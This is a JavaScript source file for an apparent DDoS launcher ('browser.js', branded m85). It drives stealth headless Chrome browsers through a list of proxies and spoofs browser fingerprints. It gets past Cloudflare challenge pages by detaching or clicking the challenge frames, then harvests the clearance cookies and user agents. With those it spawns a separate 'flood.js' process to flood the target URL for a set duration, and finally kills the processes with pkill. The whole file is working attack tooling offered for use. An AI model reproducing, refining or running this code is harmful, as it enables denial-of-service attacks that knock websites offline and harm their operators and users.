const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const { exec, spawn } = require("child_process");

const COOKIES_MAX_RETRIES = 1;

// ────────────────────────────────────────────────
// Colors & unified logging with [m85|Browser] prefix
// ────────────────────────────────────────────────
const c = {
  reset:   "\x1b[0m",
  bright:  "\x1b[1m",
  red:     "\x1b[31m",
  green:   "\x1b[32m",
  yellow:  "\x1b[33m",
  pink:    "\x1b[35m",
  cyan:    "\x1b[36m",
  white:   "\x1b[37m",
};

const PREFIX = `${c.bright}${c.cyan}[m85|Browser]${c.reset} `;

const symbols = {
  info:    "→",
  success: "✓",
  warn:    "!",
  error:   "×",
  proxy:   "→",
};

function log(type, text) {
  const symbol = symbols[type] || " ";
  let color = c.white;

  if (type === "error") color = c.red;
  if (type === "success") color = c.green;
  if (type === "warn") color = c.yellow;
  if (type === "info" || type === "proxy") color = c.cyan;
  if (type === "pink") color = c.pink;

  console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
}

const errorHandler = error => log("error", error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
  const index = this.indexOf(item);
  if (index !== -1) {
    this.splice(index, 1);
  }
  return item;
};

async function spoofFingerprint(page) {
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(window, 'screen', {
      value: {
        width: 1920,
        height: 1080,
        availWidth: 1920,
        availHeight: 1080,
        colorDepth: 64,
        pixelDepth: 64
      }
    });
    Object.defineProperty(navigator, 'userAgent', {
      value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
    });
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
      gl.getParameter = function (parameter) {
        if (parameter === gl.VENDOR) return 'WebKit';
        if (parameter === gl.RENDERER) return 'Apple GPU';
        return gl.getParameter(parameter);
      };
    }
    Object.defineProperty(navigator, 'plugins', {
      value: [{ name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 }]
    });
    Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'] });
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
    Object.defineProperty(navigator, 'deviceMemory', { value: 256 });
    Object.defineProperty(document, 'cookie', {
      configurable: true,
      enumerable: true,
      get: function () { return ''; },
      set: function () { }
    });
    Object.defineProperty(navigator, 'cookiesEnabled', {
      configurable: true,
      enumerable: true,
      get: function () { return true; },
      set: function () { }
    });
    Object.defineProperty(window, 'localStorage', {
      configurable: true,
      enumerable: true,
      value: {
        getItem: function () { return null; },
        setItem: function () { },
        removeItem: function () { }
      }
    });
    Object.defineProperty(navigator, 'doNotTrack', { value: null });
    Object.defineProperty(navigator, 'maxTouchPoints', { value: 10 });
    Object.defineProperty(navigator, 'language', { value: 'en-US' });
    Object.defineProperty(navigator, 'vendorSub', { value: '' });
  });
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <target> <threads> <proxies.txt> <rate> <time>");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3], 10);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6], 10);

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

const readProxiesFromFile = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    const proxies = data.trim().split(/\r?\n/);
    return proxies;
  } catch (error) {
    log("error", `Error reading proxies file: ${error}`);
    return [];
  }
};

const proxies = readProxiesFromFile(proxyFile);

const userAgents = () => {
  const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
  const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
  const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
  const operatingSystems = [
    "Linux", "Windows", "macOS", "Android", "iOS",
    "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX",
    "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS",
    "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"
  ];
  const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
  const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
  const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
  const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
  const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);

  // Added realistic MacBook user-agent
  const macbookUA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

  // 30% chance to return MacBook UA, otherwise random
  if (Math.random() < 0.3) {
    return macbookUA;
  }

  return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} ` +
    `(${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ` +
    `${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} ` +
    `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
};

const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_PINK: "\x1b[35m",
  COLOR_WHITE: "\x1b[37m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_GREEN: "\x1b[32m",
  cc: "\x1b[38;5;57m",
  COLOR_RESET: "\x1b[0m"
};

async function detectChallenge(browser, page, browserProxy) {
  const title = await page.title();
  const content = await page.content();
  if (content.includes("challenge-platform")) {
    log("pink", `Start Bypass Proxy → ${browserProxy}`);
    try {
      await sleep(17);
      await page.waitForSelector("body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
      const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
      if (captchaContainer) {
        await captchaContainer.click({ offset: { x: 20, y: 20 } });
      }
    } catch (error) {
      log("error", `Error in challenge detection: ${error.message}`);
    } finally {
      await sleep(8);
    }
  } else {
    log("warn", `No challenge detected → ${browserProxy}`);
    await sleep(10);
  }
}

async function openBrowser(targetURL, browserProxy) {
  const userAgent = userAgents();
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    args: [
      `--proxy-server=http://${browserProxy}`,
      "--no-sandbox",
      "--no-first-run",
      "--ignore-certificate-errors",
      "--disable-extensions",
      "--test-type",
      `--user-agent=${userAgent}`,
      "--disable-gpu",
      "--disable-browser-side-navigation"
    ]
  };
  let browser;
  try {
    browser = await puppeteer.launch(options);
    const [page] = await browser.pages();
    const client = page._client();
    page.on("framenavigated", async (frame) => {
      if (frame.url().includes("challenges.cloudflare.com") && frame._id) {
        try {
          await client.send("Target.detachFromTarget", { targetId: frame._id });
        } catch (error) {
          log("error", `Error detaching frame: ${error.message}`);
        }
      }
    });
    await spoofFingerprint(page);
    page.setDefaultNavigationTimeout(60 * 1000);
    await page.goto(targetURL, { waitUntil: "domcontentloaded" });
    await detectChallenge(browser, page, browserProxy);
    const title = await page.title();
    const cookies = await page.cookies(targetURL);
    return {
      browser,
      title,
      browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent
    };
  } catch (error) {
    log("error", `Error in openBrowser: ${error.message}`);
    if (browser) await browser.close();
    return null;
  }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  if (retries >= COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
    return;
  }
  let browser = null;
  try {
    const response = await openBrowser(targetURL, browserProxy);
    if (!response) {
      throw new Error("Failed to open browser or retrieve response");
    }
    browser = response.browser;
    if (response.title === "Just a moment..." || response.title === "Attention Required! | Cloudflare") {
      log("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
      if (browser) await browser.close();
      done(null, { task, currentTask: queue.length() });
      return;
    }
    const cookies = `[ Title ]: ${response.title}\n[ Proxy ]: ${response.browserProxy}\n[ Cookies ]: ${response.cookies}\n`;
    log("success", cookies);
    spawn("node", [
      "flood.js",
      targetURL,
      "100",
      "2",
      response.browserProxy,
      rates,
      response.cookies,
      response.userAgent
    ]);
    if (browser) await browser.close();
    done(null, { task, currentTask: queue.length() });
  } catch (error) {
    log("error", `Error in startThread: ${error.message}`);
    if (browser) await browser.close();
    await startThread(targetURL, browserProxy, task, done, retries + 1);
  }
}

const queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
  for (const browserProxy of proxies) {
    queue.push({ browserProxy });
  }
  await sleep(duration);
  queue.kill();
  exec('pkill -f flood.js', (err) => {
    if (err) log("error", `Error killing flood.js: ${err.message}`);
  });
  exec('pkill chrome', (err) => {
    if (err) log("error", `Error killing chrome: ${err.message}`);
  });
  process.exit();
}

main();	